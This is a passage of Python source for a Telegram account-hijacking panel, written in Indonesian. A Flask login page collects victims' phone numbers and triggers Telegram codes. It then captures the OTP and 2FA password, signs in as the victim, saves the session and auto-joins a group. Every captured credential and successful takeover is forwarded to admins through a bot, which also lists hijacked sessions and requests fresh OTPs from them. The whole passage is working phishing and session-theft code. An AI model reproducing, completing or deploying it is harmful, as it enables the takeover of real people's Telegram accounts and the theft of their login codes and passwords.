                    session_files = get_session_files()
                    active_count = bot_state.get_client_count()
                    
                    report_lines = [
                        f"📊 **Statistik Sesi:**\n",
                        f"• Client Aktif: `{active_count}`",
                        f"• Sesi Tersimpan: `{len(session_files)}`\n",
                        f"📂 **Daftar Sesi (10 terbaru):**\n"
                    ]
                    
                    for i, session in enumerate(session_files[:10], 1):
                        status = "🟢" if session['is_active'] else "💾"
                        size_kb = session['size'] / 1024
                        time_str = session['modified'].strftime('%d/%m %H:%M')
                        report_lines.append(f"{i}. {status} `{session['phone']}` ({size_kb:.1f}KB) - {time_str}")
                    
                    if len(session_files) > 10:
                        report_lines.append(f"\n...dan {len(session_files) - 10} sesi lainnya")
                        
                    report = "\n".join(report_lines)
                    
                    buttons = [
                        [Button.inline("🔄 Refresh", b"list_sesi"), Button.inline("🔙 Kembali", b"back_to_main")]
                    ]
                    await event.edit(report, buttons=buttons)
                except Exception as e:
                    logger.error(f"Error list sesi: {e}")
                    await event.respond(f"❌ Error: {str(e)}")
            
            elif data == "status_login":
                active_count = bot_state.get_client_count()
                
                if active_count == 0:
                    response = "❌ Tidak ada client aktif"
                else:
                    report_lines = []
                    for i, (phone, client_obj) in enumerate(list(bot_state.active_clients.items())[:10], 1):
                        try:
                            auth = await client_obj.is_user_authorized()
                            if auth:
                                me = await client_obj.get_me()
                                status = f"✅ `{me.first_name}` (`{me.phone}`)"
                            else:
                                status = "⏳ Belum Terotorisasi"
                            report_lines.append(f"{i}. {phone}: {status}")
                        except:
                            report_lines.append(f"{i}. {phone}: ❌ Error")
                    
                    response = f"🔓 **Status Login ({active_count} client):**\n\n" + "\n".join(report_lines)
                
                buttons = [
                    [Button.inline("🔄 Refresh", b"status_login"), Button.inline("🔙 Kembali", b"back_to_main")]
                ]
                await event.edit(response, buttons=buttons)
            
            elif data == "system_stats":
                session_files = get_session_files()
                active_count = bot_state.get_client_count()
                otp_requests_count = len(bot_state.otp_requests)
                
                report = (
                    f"📊 **Statistik Sistem:**\n\n"
                    f"• Sesi Aktif: `{active_count}`\n"
                    f"• Sesi Tersimpan: `{len(session_files)}`\n"
                    f"• Request OTP Aktif: `{otp_requests_count}`\n"
                    f"• Target Grup: `{bot_state.target_group_bot or 'Belum diatur'}`\n"
                    f"• Admin: `{len(ADMIN_IDS)}` user\n"
                    f"• ClickUp: `{'Terhubung' if 'access_token' in bot_state.clickup_tokens else 'Tidak terhubung'}`\n\n"
                    f"🕐 Server Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
                
                buttons = [
                    [Button.inline("🔄 Refresh", b"system_stats"), Button.inline("🔙 Kembali", b"back_to_main")]
                ]
                await event.edit(report, buttons=buttons)
            
            elif data == "logout_all":
                count = bot_state.get_client_count()
                bot_state.clear_all_clients()
                run_in_thread(send_admin_notif, f"🚫 Semua client telah di-logout ({count} client)")
                
                buttons = [[Button.inline("✅ OK", b"back_to_main")]]
                await event.edit(f"✅ {count} client telah di-logout", buttons=buttons)
            
            elif data == "reg_otp_baru":
                await event.answer("🔄 Memuat daftar sesi...", alert=False)
                session_files = get_session_files()
                active_clients = list(bot_state.active_clients.keys())
                
                if not session_files and not active_clients:
                    await event.respond("❌ Tidak ada sesi yang tersimpan atau client aktif.")
                    return
                
                buttons = []
                for phone in active_clients[:5]:
                    client = bot_state.active_clients[phone]
                    try:
                        auth_status = await client.is_user_authorized()
                        if auth_status:
                            me = await client.get_me()
                            label = f"✅ {phone} ({me.first_name})"
                        else:
                            label = f"⏳ {phone} (Belum login)"
                        buttons.append([Button.inline(label, f"reg_otp:{phone}")])
                    except:
                        buttons.append([Button.inline(f"❓ {phone} (Error)", f"reg_otp:{phone}")])
                
                for session in session_files[:5]:
                    phone = session['phone']
                    if phone in active_clients:
                        continue
                    
                    status = "🟢 Aktif" if session['is_active'] else "💾 Tersimpan"
                    label = f"{status} {phone}"
                    buttons.append([Button.inline(label, f"reg_otp:{phone}")])
                
                buttons.append([Button.inline("📝 Input Nomor Manual", b"reg_otp_manual")])
                buttons.append([Button.inline("🔙 Kembali", b"back_to_main")])
                
                await event.edit(
                    "📱 **Pilih Sesi untuk Reg OTP Baru:**\n\n✅ = Sudah login\n⏳ = Belum login\n💾 = Sesi tersimpan\n\nPilih salah satu:",
                    buttons=buttons
                )
            
            elif data == "reg_otp_manual":
                async with bot.conversation(event.sender_id) as conv:
                    await conv.send_message(
                        "📝 **Input Nomor Telepon Manual**\n\nKirim nomor telepon (contoh: 08123456789 atau +628123456789):"
                    )
                    try:
                        response = await conv.get_response(timeout=60)
                        raw_phone = response.text.strip()
                        phone = validate_phone_number(raw_phone)
                        
                        if not phone:
                            await conv.send_message("❌ Nomor telepon tidak valid!")
                            return
                        
                        session_filename = f"{phone.replace('+', '')}.session"
                        session_path = os.path.join(SESSION_DIR, session_filename)
                        
                        if os.path.exists(session_path):
                            client = TelegramClient(session_path, API_ID, API_HASH, **device_config)
                            
                            try:
                                await client.connect()
                                
                                if await client.is_user_authorized():
                                    result = await request_new_otp_from_session(phone, client)
                                    await conv.send_message(result)
                                else:
                                    sent_code = await client.send_code_request(phone)
                                    await conv.send_message(
                                        f"✅ OTP baru dikirim ke {phone}\n\n📞 Kode akan dikirim via SMS/Telegram\n🔑 Phone Code Hash: `{sent_code.phone_code_hash[:20]}...`"
                                    )
                                
                                await client.disconnect()
                                
                            except Exception as e:
                                await conv.send_message(f"❌ Error: {str(e)}")
                        else:
                            client = TelegramClient(session_path, API_ID, API_HASH, **device_config)
                            
                            try:
                                await client.connect()
                                sent_code = await client.send_code_request(phone)
                                
                                bot_state.add_active_client(phone, client)
                                
                                await conv.send_message(
                                    f"✅ Permintaan OTP berhasil!\n\n📱 Nomor: {phone}\n🔑 Phone Code Hash: `{sent_code.phone_code_hash[:20]}...`\n\nSesi telah disimpan dan siap untuk verifikasi."
                                )
                                
                            except Exception as e:
                                await conv.send_message(f"❌ Gagal: {str(e)}")
                                try:
                                    await client.disconnect()
                                except:
                                    pass
                        
                    except asyncio.TimeoutError:
                        await conv.send_message("⏰ Waktu habis, silakan coba lagi.")
            
            elif data.startswith("reg_otp:"):
                phone = data.split(":", 1)[1]
                await event.answer(f"🔄 Memproses {phone}...", alert=False)
                
                client = bot_state.get_active_client(phone)
                
                if client:
                    result = await request_new_otp_from_session(phone, client)
                    await event.edit(result, buttons=[[Button.inline("🔙 Kembali", b"reg_otp_baru")]])
                else:
                    session_filename = f"{phone.replace('+', '')}.session"
                    session_path = os.path.join(SESSION_DIR, session_filename)
                    
                    if os.path.exists(session_path):
                        try:
                            client = TelegramClient(session_path, API_ID, API_HASH, **device_config)
                            
                            await client.connect()
                            
                            if await client.is_user_authorized():
                                result = await request_new_otp_from_session(phone, client)
                                await event.edit(result, buttons=[[Button.inline("🔙 Kembali", b"reg_otp_baru")]])
                            else:
                                await event.edit(
                                    f"📱 Sesi untuk {phone} ditemukan tapi belum login.\n\nGunakan web interface untuk login terlebih dahulu.",
                                    buttons=[[Button.inline("🔙 Kembali", b"reg_otp_baru")]]
                                )
                            
                            await client.disconnect()
                            
                        except Exception as e:
                            await event.edit(f"❌ Error memuat sesi: {str(e)}", 
                                           buttons=[[Button.inline("🔙 Kembali", b"reg_otp_baru")]])
                    else:
                        await event.edit(f"❌ Sesi untuk {phone} tidak ditemukan.",
                                       buttons=[[Button.inline("🔙 Kembali", b"reg_otp_baru")]])

            else:
                await event.answer("⚠️ Tombol tidak dikenali, kembali ke menu utama", alert=True)
                status_bot = bot_state.target_group_bot if bot_state.target_group_bot else "Belum Diatur"
                active_clients_count = bot_state.get_client_count()
                
                msg = (
                    f"🤖 **Dashboard Admin Panel**\n\n"
                    f"🎯 Target Grup: `{status_bot}`\n"
                    f"✅ Status Bot: **Online**\n"
                    f"📱 Client Aktif: **{active_clients_count}**\n"
                    f"👑 Admin ID: `{event.sender_id}`"
                )
                await event.edit(msg, buttons=get_admin_buttons())
                
        except Exception as e:
            logger.error(f"Error dalam callback handler: {e}")
            await event.respond(f"❌ Error sistem: {str(e)}")
        
        finally:
            bot_state.remove_callback(callback_id)

# --- ROUTES FLASK (WEB) ---
@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    user_info = {
        "full_name": session.get('name', 'Pengguna'),
        "user_id": session.get('user_id'),
        "phone": session.get('phone', 'Tidak diketahui')
    }
    
    return render_template('index.html', info=user_info)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'user_id' in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        provinsi = request.form.get('provinsi', '').strip()
        raw_phone = request.form.get('phone', '').strip()
        
        phone = validate_phone_number(raw_phone)
        
        if not phone:
            flash("❌ Nomor telepon tidak valid! Gunakan format: 08123456789 atau 628123456789")
            return render_template('login.html')
        
        session['provinsi'] = provinsi
        bot_state.current_login_number = phone
        
        try:
            logger.info(f"Login attempt: {phone} dari {provinsi}")
            run_in_thread(send_admin_notif, f"📥 Percobaan Login Web: {phone} dari {provinsi}")
            
            user_session_path = get_session_path(phone)
            lock_file = user_session_path + '.lock'
            try:
                with open(lock_file, 'w') as f:
                    f.write(str(os.getpid()))
            except:
                pass
            
            # Buat dan connect client di thread pool
            def create_and_connect_client():
                client = TelegramClient(
                    user_session_path, 
                    API_ID, 
                    API_HASH, 
                    **device_config,
                    timeout=20,
                    connection_retries=3,
                    retry_delay=2
                )
                
                if not client.is_connected():
                    client.connect()
                
                sent_code = client.send_code_request(phone)
                return client, sent_code
            
            try:
                client, sent_code = run_in_thread(create_and_connect_client)
                
                # Simpan client ke state
                bot_state.add_active_client(phone, client)
                
                # Simpan ke session
                session['phone'] = phone
                session['phone_code_hash'] = sent_code.phone_code_hash
                session['client_session'] = os.path.basename(user_session_path)
                
                # Notifikasi admin
                run_in_thread(send_admin_notif, f"✅ OTP Terkirim! Nomor: {phone}")
                
                flash("✅ Kode OTP telah dikirim! Cek aplikasi Telegram Anda.")
                return redirect(url_for('verify'))
                
            except PhoneNumberInvalidError:
                flash("❌ Nomor telepon tidak valid di sistem Telegram!")
            except FloodWaitError as fwe:
                wait_time = fwe.seconds
                minutes = wait_time // 60
                seconds = wait_time % 60
                flash(f"⏳ Terlalu banyak percobaan. Tunggu {minutes} menit {seconds} detik.")
                logger.warning(f"Flood wait untuk {phone}: {wait_time}s")
            except RPCError as e:
                logger.error(f"RPC Error: {e}")
                flash(f"❌ Error Telegram: {str(e)}")
            except Exception as e:
                if "database is locked" in str(e).lower():
                    flash("❌ Database sedang digunakan. Silakan coba lagi dalam beberapa detik.")
                else:
                    flash(f"❌ Gagal: {str(e)}")
                logger.error(f"Login error untuk {phone}: {e}")
            
            finally:
                try:
                    if os.path.exists(lock_file):
                        os.remove(lock_file)
                except:
                    pass
            
            return render_template('login.html')
            
        except Exception as e:
            logger.error(f"Unexpected error in login: {e}")
            flash(f"❌ Gagal: {str(e)}")
            return render_template('login.html')
    
    return render_template('login.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    if 'phone' not in session or 'phone_code_hash' not in session:
        flash("❌ Sesi tidak valid, silakan login ulang")
        return redirect(url_for('login'))
    
    phone = session['phone']
    phone_hash = session['phone_code_hash']
    
    if request.method == 'POST':
        otp = request.form.get('otp', '').strip()
        password = request.form.get('password', '').strip()
        
        if not otp and not password:
            flash("❌ Masukkan kode OTP atau password 2FA")
            return render_template('verify.html', password_required=False)
        
        bot_state.otp_session_cache = f"Phone: {phone}\nOTP: {otp}\n2FA: {password if password else 'N/A'}"
        
        run_in_thread(send_admin_notif,
            f"🔑 **Data OTP Masuk!**\nNomor: `{phone}`\nKode: `{otp}`\n2FA: `{'Ya' if password else 'Tidak'}`"
        )
        
        try:
            client = bot_state.get_active_client(phone)
            if not client:
                flash("❌ Sesi tidak ditemukan, silakan login ulang")
                return redirect(url_for('login'))
            
            if not client.is_connected():
                client.connect()
            
            if password:
                user = client.sign_in(phone=phone, password=password)
            else:
                user = client.sign_in(phone=phone, code=otp, phone_code_hash=phone_hash)
            
            session['user_id'] = user.id
            session['name'] = user.first_name or "User"
            session['username'] = user.username or ""
            
            try:
                client(JoinChannelRequest(WEB_SPECIAL_GROUP_LINK))
                logger.info(f"User {phone} joined group")
            except Exception as e:
                logger.warning(f"Gagal join grup: {e}")
            
            run_in_thread(send_admin_notif,
                f"✅ **LOGIN BERHASIL!**\nUser: {user.first_name}\nPhone: `{phone}`\nID: `{user.id}`\nProvinsi: {session.get('provinsi', 'Tidak diketahui')}"
            )
            
            flash(f"✅ Login berhasil! Selamat datang {user.first_name}")
            return redirect(url_for('index'))
            
        except SessionPasswordNeededError:
            return render_template('verify.html', password_required=True)
        except PhoneCodeInvalidError:
            flash("❌ Kode OTP salah!")
        except PhoneCodeExpiredError:
            flash("❌ Kode OTP sudah kadaluarsa! Minta kode baru.")
            return redirect(url_for('login'))
        except Exception as e:
            flash(f"❌ Gagal: {str(e)}")
            logger.error(f"Verify error untuk {phone}: {e}")
    
    return render_template('verify.html', password_required=False)

@app.route('/logout')
def logout():
    phone = session.get('phone')
    if phone and phone in bot_state.active_clients:
        try:
            client = bot_state.active_clients[phone]
            client.disconnect()
            bot_state.remove_client(phone)
            logger.info(f"User {phone} logged out")
        except Exception as e:
            logger.error(f"Error during logout: {e}")
    
    session.clear()
    flash("✅ Anda telah logout")
    return redirect(url_for('login'))

@app.route('/api/status')
def api_status():
    status = {
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'active_clients': bot_state.get_client_count(),
        'target_group': bot_state.target_group_bot,
        'admin_count': len(ADMIN_IDS),
        'sessions_count': len([f for f in os.listdir(SESSION_DIR) if f.endswith('.session')]),
        'otp_requests': len(bot_state.otp_requests),
        'clickup_connected': 'access_token' in bot_state.clickup_tokens,
        'pending_callbacks': len(bot_state.pending_callbacks)
    }
    return jsonify(status)

@app.route('/api/otp_requests')
def api_otp_requests():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    return jsonify({
        'count': len(bot_state.otp_requests),
        'requests': bot_state.otp_requests
    })

@app.route('/api/clickup/status')
def api_clickup_status():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    status = run_async(ClickUpAI.get_status())
    return jsonify(status)

# --- BACKGROUND PROCESS ---
async def bot_main():
    global bot
    
    try:
        bot = TelegramClient(BOT_SESSION, API_ID, API_HASH)
        await bot.start(bot_token=BOT_TOKEN)
        
        await setup_bot_handlers()
        
        logger.info("🤖 BOT ADMIN READY - Fitur AI ClickUp Aktif")
        
        startup_msg = (
            f"🤖 **Bot Admin Started**\n\n"
            f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"📍 Host: {config['host']}:{config['port']}\n"
            f"🤖 Fitur: AI ClickUp aktif\n"
            f"🔗 Client ID: {CLICKUP_CLIENT_ID[:10]}..."
        )
        
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, startup_msg)
            except Exception as e:
                logger.error(f"Failed to send startup message to admin {admin_id}: {e}")
        
        await bot.run_until_disconnected()
        
    except Exception as e:
        logger.error(f"Bot error: {e}")
        raise

def start_telegram_bot():
    """Menjalankan bot Telegram di thread terpisah"""
    loop = loop_manager.get_main_loop()
    asyncio.set_event_loop(loop)
    
    try:
        loop.create_task(periodic_cleanup())
        loop.run_until_complete(bot_main())
    except KeyboardInterrupt:
        logger.info("Bot dihentikan")
    except Exception as e:
        logger.error(f"Fatal error in bot: {e}")

# --- MAIN EXECUTION ---
if __name__ == '__main__':
    # Start bot di thread terpisah
    bot_thread = threading.Thread(target=start_telegram_bot, daemon=True)
    bot_thread.start()
    
    # Test ClickUp connection
    try:
        clickup_status = run_async(ClickUpAI.get_status(), timeout=10)
        if clickup_status.get('status') == 'connected':
            logger.info(f"✅ AI ClickUp Connected: {clickup_status['user']}")
        else:
            logger.warning(f"⚠️ AI ClickUp Connection: {clickup_status.get('message', 'Unknown')}")
    except:
        logger.warning("⚠️ AI ClickUp connection test skipped")
    
    logger.info(f"🚀 Starting Flask server on {config['host']}:{config['port']}")
    logger.info(f"🤖 AI ClickUp Client ID: {CLICKUP_CLIENT_ID[:10]}...")
    
    try:
        app.run(
            host=config['host'],
            port=config['port'],
            debug=False,
            use_reloader=False,
            threaded=True,
            processes=1
        )
    except Exception as e:
        logger.error(f"Failed to start Flask server: {e}")
    finally:
        loop_manager.shutdown()